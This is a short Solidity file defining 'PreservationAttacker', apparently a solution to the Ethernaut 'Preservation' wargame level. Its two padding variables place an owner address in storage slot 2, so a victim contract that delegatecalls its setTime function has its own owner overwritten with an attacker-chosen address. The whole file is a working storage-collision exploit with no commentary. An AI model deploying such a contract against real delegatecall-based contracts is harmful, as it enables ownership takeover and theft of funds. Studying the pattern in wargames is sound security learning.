// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttacker {
    uint256 public _unused;
    uint256 public _unused2;
    address public owner;

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
